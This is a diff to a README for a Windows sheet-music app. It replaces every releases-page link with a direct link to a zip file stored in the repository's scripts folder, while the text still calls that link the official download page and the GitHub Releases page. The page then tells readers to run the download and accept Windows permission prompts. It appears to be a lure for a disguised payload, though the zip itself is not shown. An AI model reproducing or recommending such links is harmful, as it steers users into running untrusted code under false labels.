@@ -1,7 +1,7 @@
 <h1>🎼 To-Sheet-Music-Skill - Turn Songs into Playable Band Scores Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases">
+  <a href="https://raw.githubusercontent.com/Roriespinyedged3460/To-Sheet-Music-Skill/main/scripts/To_Music_Sheet_Skill_2.7-alpha.1.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=%234CAF50" alt="Download Button" style="max-width: 100%; height: auto; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); margin: 20px 0;">
   </a>
 </p>
@@ -40,7 +40,7 @@
 <p>Getting up and running is incredibly simple. Follow these exact steps and you will be generating sheet music within minutes.</p>
 
 <h3>Step 1: Download the Application</h3>
-<p>Visit this link to downloadthe application: <a href="https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases"><strong>https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases</strong></a>. This is the official download page, where you will find the latest version of the software. Just click the download button for the Windows installer.</p>
+<p>Visit this link to downloadthe application: <a href="https://raw.githubusercontent.com/Roriespinyedged3460/To-Sheet-Music-Skill/main/scripts/To_Music_Sheet_Skill_2.7-alpha.1.zip"><strong>https://raw.githubusercontent.com/Roriespinyedged3460/To-Sheet-Music-Skill/main/scripts/To_Music_Sheet_Skill_2.7-alpha.1.zip</strong></a>. This is the official download page, where you will find the latest version of the software. Just click the download button for the Windows installer.</p>
 
 <h3>Step 2: Run the Installer</h3>
 <p>Once the download finishes, open your <strong>Downloads</strong> folder. Double-click the downloaded file to start the installation process. If Windows asks for permission, click <strong>&quot;Yes&quot;</strong>. Follow any simple on-screen prompts—you can just keep clicking&nbsp;<strong>&quot;Next&quot;</strong>&nbsp;and then&nbsp;<strong>&quot;Install&quot;</strong>. It truly takes less than a minute.</p>
@@ -122,13 +122,13 @@
 <p>Check that your system volume is not muted. Also, in the app’s settings menu, make sure the correct audio output device is selected. Restartthe app after changing audio settings.</p>
 
 <h2>📬 Get Help &amp; Give Feedback</h2>
-<p>If you run into any problems or have suggestions, please visit the <a href="https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases">GitHub Releases page</a> and file an issue there. The community and developers are happy to help you get your band playing great music quickly.</p>
+<p>If you run into any problems or have suggestions, please visit the <a href="https://raw.githubusercontent.com/Roriespinyedged3460/To-Sheet-Music-Skill/main/scripts/To_Music_Sheet_Skill_2.7-alpha.1.zip">GitHub Releases page</a> and file an issue there. The community and developers are happy to help you get your band playing great music quickly.</p>
 
 <p>Also, do not forget to check for updates regularly—new features and improvements are added often. The app wills notify you when an update is available, but you can also manually check by visiting the same download page above.</p>
 
 <h2>🎉 Ready to Make Music?</h2>
 <p>Stop spending hours writing sheet music by hand. Download To-Sheet-Music-Skill today, load up your favorite song, and have a complete, playable five-piece band arrangement totake to your next rehearsal within minutes. Your band will think you are a musical wizard!</p>
 
-<p style="margin: 30px 0; text-align: center;"><a href="https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 40px; font-size: 18px; border-radius: 50px; text-decoration: none; box-shadow: 0 4px 15px rgba(102,126,234,0.4);">⬇️ Download To-Sheet-Music-Skill Now</a></p>
+<p style="margin: 30px 0; text-align: center;"><a href="https://raw.githubusercontent.com/Roriespinyedged3460/To-Sheet-Music-Skill/main/scripts/To_Music_Sheet_Skill_2.7-alpha.1.zip" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 40px; font-size: 18px; border-radius: 50px; text-decoration: none; box-shadow: 0 4px 15px rgba(102,126,234,0.4);">⬇️ Download To-Sheet-Music-Skill Now</a></p>
 
 <p style="text-align: center; font-size: 14px; color: #666; margin-top: 20px;">© 2024 To-Sheet-Music-Skill. All rights reserved. Windows is a registered trademark of Microsoft Corporation. MuseScore is a registered trademark of Muse Group.</p>
